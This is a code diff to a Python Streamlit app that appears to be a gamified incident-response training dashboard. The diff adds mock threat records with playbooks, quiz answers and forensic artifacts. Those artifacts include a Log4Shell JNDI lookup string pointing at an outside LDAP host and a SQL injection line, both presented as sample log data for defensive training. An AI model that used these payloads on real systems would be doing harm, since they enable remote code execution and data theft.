@@ -14,6 +14,76 @@ import boto3
 
 
 # --- TACTICAL DATA MODELS ---
+MOCK_THREAT_POOL = [
+    {
+        "ID": "TR-1001", "Severity": "Low", "Source": "Edge-Sec", "Vector": "Phishing Attempt", "Status": "Active", "lat": 34.0522, "lon": -118.2437, "MITRE": "T1566.001", "CVE": "N/A",
+        "Playbook": ["Block Sender", "Quarantine Mail", "Ignore"], "Correct": "Quarantine Mail", 
+        "DistractorExplanations": {"Block Sender": "Insufficient. The payload is already in the inbox.", "Ignore": "High risk of credential theft."},
+        "Hint": "Isolate the delivery vector immediately.",
+        "Steps": ["1. Purge mail from all inboxes", "2. Block sender domain at gateway", "3. Force password reset for recipient."],
+        "Insight": "Entry-level phishing simulation: suspicious .zip link detected in HR mail queue.",
+        "Forensics": {
+            "type": "JSON_LOG",
+            "data": {
+                "email_headers": "From: accounts-verify@paypa1-support.com\nSubject: Critical Security Alert\nX-Mailer: PHPMailer 5.2.1",
+                "attachment_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+            }
+        }
+    },
+    {
+        "ID": "TR-1002", "Severity": "Medium", "Source": "Intra-Probe", "Vector": "Internal Network Scan", "Status": "Active", "lat": 35.6762, "lon": -139.6503, "MITRE": "T1046", "CVE": "N/A", 
+        "Playbook": ["Disable Port", "Quarantine Host", "Audit Logs"], "Correct": "Quarantine Host",
+        "DistractorExplanations": {"Disable Port": "Too narrow. Attacker will switch ports.", "Audit Logs": "Good for forensics, but doesn't stop the live scan."},
+        "Hint": "Stop the reconnaissance phase by isolating the source machine.",
+        "Steps": ["1. Move host to isolation VLAN", "2. Terminate scanning process", "3. Snapshot disk for analysis."],
+        "Insight": "Intermediate scan detected. Unauthorized Nmap activity from developer workstation.",
+        "Forensics": {
+            "type": "PCAP_SNIPPET",
+            "data": "IP 192.168.1.45.54212 > 192.168.1.1.80: Flags [S], seq 12345, win 64240\nIP 192.168.1.45.54213 > 192.168.1.1.443: Flags [S], seq 67890, win 64240"
+        }
+    },
+    {
+        "ID": "TR-1081", "Severity": "Critical", "Source": "Suricata", "Vector": "Log4Shell RCE", "Status": "Active", "lat": 51.5074, "lon": -0.1278, "MITRE": "T1190", "CVE": "CVE-2021-44228", 
+        "Playbook": ["Disable JNDI", "Patch Log4j", "WAF Filter"], "Correct": "Patch Log4j", 
+        "DistractorExplanations": {"Disable JNDI": "Suboptimal. The library remains on disk and can be bypassed.", "WAF Filter": "Ineffective against nested polymorphic lookups."},
+        "Hint": "Look for the remediation that targets the library version itself.",
+        "Steps": ["1. Identify vulnerable JARs", "2. Update to Log4j 2.17+", "3. Restart JVM."],
+        "Insight": "Polymorphic payload detected. Obfuscated strings observed bypassing EDR.",
+        "Forensics": {
+            "type": "JSON_LOG",
+            "data": {
+                "http_method": "GET",
+                "user_agent": "${jndi:ldap://104.248.x.x:1389/a}",
+                "path": "/api/v1/auth"
+            }
+        }
+    },
+    {
+        "ID": "TR-1084", "Severity": "Critical", "Source": "Darktrace", "Vector": "MOVEit Transfer Exfil", "Status": "Active", "lat": 40.7128, "lon": -74.0060, "MITRE": "T1190", "CVE": "CVE-2023-34362", 
+        "Playbook": ["Disable SFTP", "Rotate DB Keys", "IP Blocklist"], "Correct": "IP Blocklist",
+        "DistractorExplanations": {"Disable SFTP": "Too slow. Data is already leaving via HTTPS.", "Rotate DB Keys": "Doesn't stop the current exfiltration stream."},
+        "Hint": "We need an immediate network block on the egress destination.",
+        "Steps": ["1. Block Source IP at Firewall", "2. Quarantining File Server", "3. Audit SFTP Logs."],
+        "Insight": "Zero-day SQL injection in progress. High-volume data exfiltration detected.",
+        "Forensics": {
+            "type": "SQL_AUDIT",
+            "data": "SELECT * FROM guest_users WHERE id = '' OR '1'='1'; --\nUPDATE moveit_files SET status = 'EXFIL_PENDING' WHERE size > 100MB"
+        }
+    },
+    {
+        "ID": "TR-1089", "Severity": "Critical", "Source": "GuardDuty", "Vector": "Citrix Bleed", "Status": "Active", "lat": 1.3521, "lon": 103.8198, "MITRE": "T1190", "CVE": "CVE-2023-4966", 
+        "Playbook": ["Clear Sessions", "Update NetScaler", "Kill Active VPN"], "Correct": "Update NetScaler",
+        "DistractorExplanations": {"Clear Sessions": "Temporary. The exploit can be re-run immediately.", "Kill Active VPN": "Does not address the vulnerability in the NetScaler appliance."},
+        "Hint": "The vulnerability lies in the appliance memory handling.",
+        "Steps": ["1. Apply NetScaler firmware patch", "2. Force password reset", "3. Clear all active sessions."],
+        "Insight": "Information disclosure vulnerability allowing session hijacking without credentials.",
+        "Forensics": {
+            "type": "MEM_DUMP_STRINGS",
+            "data": "GET /oauth/idp/.well-known/openid-configuration HTTP/1.1\nHost: citrix.internal\nCookie: session=....[OVERSHARED DATA BUFFER CONTENT]...."
+        }
+    }
+]
+
 IR_PHASE_CHALLENGES = {
     1: {"q": "What tool helps determine if this binary has been seen globally?", "options": ["Nmap", "VirusTotal", "Wireshark"], "correct": "VirusTotal", "exp": "VirusTotal aggregates antivirus scans and provides global reputation data for files/hashes."},
     2: {"q": "How do we effectively isolate the endpoint without alerting the adversary?", "options": ["Physical Disconnect", "VLAN Quarantine", "Shutdown OS"], "correct": "VLAN Quarantine", "exp": "VLAN quarantine maintains the host's state for forensics while cutting lateral movement paths."},
@@ -259,50 +329,8 @@ def get_active_threats_data() -> pd.DataFrame:
                     local_data = json.load(f)
             except Exception:
                 pass
-    
-    threat_pool = [
-        {
-            "ID": "TR-1001", "Severity": "Low", "Source": "Edge-Sec", "Vector": "Phishing Attempt", "Status": "Active", "lat": 34.0522, "lon": -118.2437, "MITRE": "T1566.001", "CVE": "N/A",
-            "Playbook": ["Block Sender", "Quarantine Mail", "Ignore"], "Correct": "Quarantine Mail", 
-            "DistractorExplanations": {"Block Sender": "Insufficient. The payload is already in the inbox.", "Ignore": "High risk of credential theft."},
-            "Hint": "Isolate the delivery vector immediately.",
-            "Steps": ["1. Purge mail from all inboxes", "2. Block sender domain at gateway", "3. Force password reset for recipient."],
-            "Insight": "Entry-level phishing simulation: suspicious .zip link detected in HR mail queue."
-        },
-        {
-            "ID": "TR-1002", "Severity": "Medium", "Source": "Intra-Probe", "Vector": "Internal Network Scan", "Status": "Active", "lat": 35.6762, "lon": -139.6503, "MITRE": "T1046", "CVE": "N/A", 
-            "Playbook": ["Disable Port", "Quarantine Host", "Audit Logs"], "Correct": "Quarantine Host",
-            "DistractorExplanations": {"Disable Port": "Too narrow. Attacker will switch ports.", "Audit Logs": "Good for forensics, but doesn't stop the live scan."},
-            "Hint": "Stop the reconnaissance phase by isolating the source machine.",
-            "Steps": ["1. Move host to isolation VLAN", "2. Terminate scanning process", "3. Snapshot disk for analysis."],
-            "Insight": "Intermediate scan detected. Unauthorized Nmap activity from developer workstation."
-        },
-        {
-            "ID": "TR-1081", "Severity": "Critical", "Source": "Suricata", "Vector": "Log4Shell RCE", "Status": "Active", "lat": 51.5074, "lon": -0.1278, "MITRE": "T1190", "CVE": "CVE-2021-44228", 
-            "Playbook": ["Disable JNDI", "Patch Log4j", "WAF Filter"], "Correct": "Patch Log4j", 
-            "DistractorExplanations": {"Disable JNDI": "Suboptimal. The library remains on disk and can be bypassed.", "WAF Filter": "Ineffective against nested polymorphic lookups."},
-            "Hint": "Look for the remediation that targets the library version itself.",
-            "Steps": ["1. Identify vulnerable JARs", "2. Update to Log4j 2.17+", "3. Restart JVM."],
-            "Insight": "Polymorphic payload detected. Obfuscated strings observed bypassing EDR."
-        },
-        {
-            "ID": "TR-1084", "Severity": "Critical", "Source": "Darktrace", "Vector": "MOVEit Transfer Exfil", "Status": "Active", "lat": 40.7128, "lon": -74.0060, "MITRE": "T1190", "CVE": "CVE-2023-34362", 
-            "Playbook": ["Disable SFTP", "Rotate DB Keys", "IP Blocklist"], "Correct": "IP Blocklist",
-            "DistractorExplanations": {"Disable SFTP": "Too slow. Data is already leaving via HTTPS.", "Rotate DB Keys": "Doesn't stop the current exfiltration stream."},
-            "Hint": "We need an immediate network block on the egress destination.",
-            "Steps": ["1. Block Source IP at Firewall", "2. Quarantining File Server", "3. Audit SFTP Logs."],
-            "Insight": "Zero-day SQL injection in progress. High-volume data exfiltration detected."
-        },
-        {
-            "ID": "TR-1089", "Severity": "Critical", "Source": "GuardDuty", "Vector": "Citrix Bleed", "Status": "Active", "lat": 1.3521, "lon": 103.8198, "MITRE": "T1190", "CVE": "CVE-2023-4966", 
-            "Playbook": ["Clear Sessions", "Update NetScaler", "Kill Active VPN"], "Correct": "Update NetScaler",
-            "DistractorExplanations": {"Clear Sessions": "Temporary. The exploit can be re-run immediately.", "Kill Active VPN": "Does not address the vulnerability in the NetScaler appliance."},
-            "Hint": "The vulnerability lies in the appliance memory handling.",
-            "Steps": ["1. Apply NetScaler firmware patch", "2. Force password reset", "3. Clear all active sessions."],
-            "Insight": "Information disclosure vulnerability allowing session hijacking without credentials."
-        }
-    ]
-    return pd.DataFrame(local_data + threat_pool)
+
+    return pd.DataFrame(local_data + MOCK_THREAT_POOL)
 
 
 def get_pipeline_status_data() -> pd.DataFrame:
@@ -356,7 +384,9 @@ def render_active_threats() -> None:
         mitre_id = str(row.get("MITRE", ""))
         cve_id = str(row.get("CVE", ""))
         
-        mitre_link = f'<a href="https://attack.mitre.org/techniques/{mitre_id}/" target="_blank" style="color:#00FF00;text-decoration:none;">{mitre_id}</a>' if "T" in mitre_id else mitre_id
+        # MITRE sub-techniques (e.g. T1566.001) require a slash in the URL: techniques/T1566/001/
+        mitre_url_path = mitre_id.replace(".", "/")
+        mitre_link = f'<a href="https://attack.mitre.org/techniques/{mitre_url_path}/" target="_blank" style="color:#00FF00;text-decoration:none;">{mitre_id}</a>' if "T" in mitre_id else mitre_id
         cve_link = f'<a href="https://nvd.nist.gov/vuln/detail/{cve_id}" target="_blank" style="color:#00FF00;text-decoration:none;">{cve_id}</a>' if "CVE" in cve_id.upper() else cve_id
 
         threat_html = f'<div style="margin-bottom:12px;border-left:2px solid {severity_color};padding-left:10px;"><div style="font-size:0.75rem;color:#FFFFFF;">[{row["Time"]}] <span style="color:{severity_color};">{row["Source"]}</span></div><div style="font-size:0.8rem;color:#FFFFFF;font-weight:bold;">{row["Vector"]}</div><div style="font-size:0.7rem;color:#00FF00;margin-top:2px;font-family:\'Courier New\',monospace;">{mitre_link} | {cve_link}</div></div>'
@@ -451,6 +481,20 @@ def remediation_dialog(latest):
             else:
                 st.error(f"❌ INCORRECT: {latest.get('DistractorExplanations', {}).get(choice, 'Protocol violation.')}")
         return
+
+    # Forensic Workbench Section
+    with st.expander("🛠️ FORENSIC WORKBENCH (RAW DATA)", expanded=False):
+        forensics = latest.get("Forensics", {"type": "UNAVAILABLE", "data": "No forensic data captured for this incident."})
+        st.info(f"DATA TYPE: {forensics['type']}")
+        
+        if isinstance(forensics['data'], dict):
+            st.json(forensics['data'])
+        else:
+            st.code(forensics['data'], language="bash")
+        
+        st.markdown("""<p style="font-size:0.7rem; color:#777777;">
+            Use the raw artifacts above to correlate the Vector with NIST/MITRE intelligence.
+        </p>""", unsafe_allow_html=True)
 
     steps = [
         "1. CONTAINMENT: Isolate affected systems",
@@ -635,13 +679,27 @@ def render_ai_analyst() -> None:
 
     latest = threat_log[0]
     
-    intel_text = ""
     if st.session_state.show_intel and latest:
-        mitre_id = latest.get('MITRE','')
-        cve_id = latest.get('CVE','')
-        mitre_link = f"<a href='https://attack.mitre.org/techniques/{mitre_id}/' target='_blank' style='color:#00FF00;'>MITRE: {mitre_id}</a>" if "T" in mitre_id else mitre_id
-        cve_link = f"<a href='https://nvd.nist.gov/vuln/detail/{cve_id}' target='_blank' style='color:#00FF00;'>NIST: {cve_id}</a>" if "CVE" in cve_id else cve_id
-        intel_text = f"<br><br>> AI CHARLIE: Accessing intel...<br>> - {mitre_link}<br>> - {cve_link}"
+        mitre_id = latest.get('MITRE', '')
+        
+        # Reset summary if the technique has changed
+        if st.session_state.get('last_mitre_id') != mitre_id:
+            st.session_state.intel_summary = ""
+            st.session_state.last_mitre_id = mitre_id
+
+        # Fetch summary if it doesn't exist
+        if not st.session_state.get('intel_summary') and "T" in mitre_id:
+            summary_prompt = f"Briefly summarize MITRE technique {mitre_id}. Provide one sentence on what it is, one on detection, and one on mitigation."
+            st.session_state.intel_summary = ask_ai_charlie(summary_prompt, mitre_id)
+
+        # Ensure sub-techniques use the correct URL format
+        mitre_url_path = mitre_id.replace(".", "/")
+        mitre_link = f"<a href='https://attack.mitre.org/techniques/{mitre_url_path}/' target='_blank' style='color:#00FF00;'>MITRE: {mitre_id}</a>" if "T" in mitre_id else mitre_id
+        
+        summary = st.session_state.get('intel_summary', 'No summary available.')
+        intel_text = f"<br><br>> AI CHARLIE: Intel Summary for {mitre_link}:<br>> {summary}"
+    else:
+        intel_text = ""
     
     chat_display = ""
     for chat in st.session_state.chat_history[-2:]:
@@ -694,6 +752,8 @@ def render_ai_analyst() -> None:
                 st.balloons()
                 st.session_state.points += 10
                 st.session_state.threat_log.pop(0)
+                st.session_state.intel_summary = ""
+                st.session_state.last_mitre_id = ""
                 st.session_state.show_intel = False; st.session_state.show_hint = False; st.session_state.last_error = ""
                 st.session_state.assets_count += random.randint(1, 10)
                 s_list = latest.get('Steps', [])
@@ -786,6 +846,8 @@ def initialize_session_state() -> None:
     defaults = {
         "threat_log": [],
         "threat_count": 0,
+        "intel_summary": "",
+        "last_mitre_id": "",
         "assets_count": 0,
         "points": 0,
         "prev_rank_idx": 0,
@@ -858,9 +920,14 @@ def main() -> None:
                 else:
                     candidates = pool[pool['Severity'].isin(['High', 'Critical'])]
                 
-                if candidates.empty: candidates = pool
-                
-                new_threat = candidates.sample(1).to_dict('records')[0].copy()
+                if candidates.empty:
+                    candidates = pool
+
+                if candidates.empty:
+                    st.error("Simulation Failure: No available threat patterns found.")
+                    return
+
+                new_threat = candidates.sample(1).iloc[0].to_dict().copy()
                 new_threat["ID"] = f"TR-AUTO-{random.randint(1000, 9999)}"
                 new_threat["Time"] = datetime.now(ZoneInfo("Europe/Berlin")).strftime("%H:%M:%S")
                 st.session_state.threat_log = [new_threat] + st.session_state.threat_log[:9]
